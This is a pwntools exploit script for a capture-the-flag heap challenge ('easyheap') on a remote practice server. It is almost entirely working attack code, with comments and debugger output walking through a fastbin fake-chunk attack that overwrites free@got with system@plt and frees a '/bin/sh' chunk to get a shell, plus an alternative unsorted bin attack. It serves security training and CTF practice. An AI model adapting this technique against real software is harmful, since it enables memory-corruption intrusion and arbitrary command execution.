from pwn import *
context(os='linux',arch='amd64')
context.log_level='DEBUG'

# we can make magic to a big num by unsorted bin attack and make program read the flag locally
# but there is no such dictory at server,
# so when wen connect to server, we need try other way
# we can get a fake_chunk which point to near of 0x00000000006020E0(heaparray),
# and make one of heaparray point to free@got,
# then we rewirte it potint to sysytem@plt and free a chunk which content is str '/bin/sh\x00'
# in function getshell(), we store '/bin/sh\x00' at id1, and rewrite id0 to free@got by house of sprit

# p = process('./easyheap')
p = remote('node3.buuoj.cn',29661)

s       = lambda data               :p.send(str(data))
sa      = lambda delim,data         :p.sendafter(str(delim), str(data))
sl      = lambda data               :p.sendline(str(data))
sla     = lambda delim,data         :p.sendlineafter(str(delim), str(data))
r       = lambda num=4096           :p.recv(num)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
itr     = lambda                    :p.interactive()
uu32    = lambda data               :u32(data.ljust(4,'\0'))
uu64    = lambda data               :u64(data.ljust(8,'\0'))
leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))

def create(size,content):
	ru("Your choice :")
	s(1)
	ru("Size of Heap : ")
	s(size)
	ru("Content of heap:")
	s(content)

def edit(index,content):
	ru("Your choice :")
	s(2)
	ru("Index :")
	s(index)
	ru("Size of Heap : ")
	s(len(content))
	ru("Content of heap : ")
	s(content)

def delete(index):
	ru("Your choice :")
	s(3)
	ru("Index :")
	s(index)

def dbg():
	gdb.attach(p)
	pause()

def l33t():
	ru("Your choice :")
	s(0x1305)
	ru("Congrt !\n")
	print r()

def read_flag():
	fake_chunk = 0x00000000006020C0 - 0x10

	create(0x20,'aaaa') #id0
	create(0x80,'ABCD')	#id1
	create(0x10,'BCDE')	#id2

	delete(1)
	payload = p64(0)*5 + p64(0x91) + p64(fake_chunk)*2
	edit(0,payload)
	create(0x80,'bbbb') #id1
	l33t()

def getshell():
	elf = ELF('./easyheap',checksec=False)
	system_plt = elf.plt['system']
	free_got = elf.got['free']
	create(0x68,'a') #id0
	create(0x68,'b') #id1
	create(0x68,'c') #id2 is used to get a fake_chunk which point to heaparray[0]
	delete(2)
	# dbg()
	# pwndbg> x/4g 0x00000000006020e0 -0x40 + 0xd
	# 0x6020ad:	0x43ed0238e0000000	0x000000000000007f
	# 0x6020bd:	0x0000000000000000	0x0000000000000000

	payload = '/bin/sh\x00' + p64(0)*12 + p64(0x71) + p64(0x00000000006020e0 -0x40 + 0xd)
	edit(1,payload)
	# dbg()
	# pwndbg> fast
	# fastbins
	# 0x20: 0x0
	# 0x30: 0x0
	# 0x40: 0x0
	# 0x50: 0x0
	# 0x60: 0x0
	# 0x70: 0x15d40e0 -> 0x6020ad <- 0x0

	create(0x68,'b') #id1
	create(0x68,'d') #fake_chunk
	payload = p64(0)*4 + '\x00'*3 + p64(free_got)
	edit(3,payload)
	# dbg()
	# pwndbg> x/x 0x6020e0
	# 0x6020e0 <heaparray>:	0x0000000000602018
	# now, id0 is point to free@got and id1's content is '/bin/sh\x00'

	edit(0,p64(system_plt))
	# dbg()
	# pwndbg> x/x 0x6020e0
	# 0x6020e0 <heaparray>:	0x00602018 <- free@got
	# pwndbg> x/x 0x00400700 <- system@plt
	# 0x602018:	0x00602038

	delete(1)
	itr()
	# dbg()

if __name__ == '__main__':
	getshell()
	# read_flag()
